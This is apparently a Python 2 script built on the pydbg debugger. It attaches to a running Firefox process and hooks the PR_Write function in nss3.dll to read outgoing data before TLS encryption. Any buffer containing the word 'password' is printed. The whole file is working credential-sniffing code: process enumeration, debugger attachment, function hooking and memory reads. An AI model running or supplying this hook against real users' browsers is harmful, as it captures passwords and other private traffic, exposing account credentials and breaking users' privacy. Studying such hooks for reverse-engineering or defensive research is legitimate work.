from pydbg import *
from pydbg.defines import *
import utils
import sys


# This is entry hook callback function
# The argument we are interested in is args[1]
def ssl_sniff(dbg, args):

    # Lets set a pattern that we can make the hook search for
    pattern = 'password'

    # Now read out the memory pointed to by the second argument
    # it is stored as an ASCII string with length in the third argument.
    data = dbg.read_process_memory(args[1], args[2])
    if pattern in data:
        print "PRE-ENCRYPTED:\n%s" % data

    return DBG_CONTINUE

if __name__ == '__main__':
    dbg = pydbg()
    FIREFOX_EXE = 'firefox.exe'
    found_firefox = False

    # Quick and dirty process enumeration to find firefox.exe
    for (pid, name) in dbg.enumerate_processes():
        if name.lower() == FIREFOX_EXE:
            found_firefox = True
            hooks = utils.hook_container()

            print '[*] Attaching to firefox.exe with PID: %d' % pid
            dbg.attach(pid)

            # Resolve the function address
            hook_address = dbg.func_resolve_debuggee('nss3.dll', 'PR_Write')

            if hook_address:
                # Add the hook to the container. We aren't interested
                # in using an exit callback, so we set it to None
                hooks.add(dbg, hook_address, num_args=3, entry_hook=ssl_sniff)
                print '[*] nspr4.PR_Write hooked at: 0x%08x' % hook_address
                break
            else:
                print '[*] Error: Couldn\'t resolve PR_Write address'
                sys.exit(-1)

    if found_firefox:
        print '[*] Hooks set, continuting process'
        dbg.run()
    else:
        print '[*] Error: Couldn\'t find the firefox.exe process'
        sys.exit(-1)
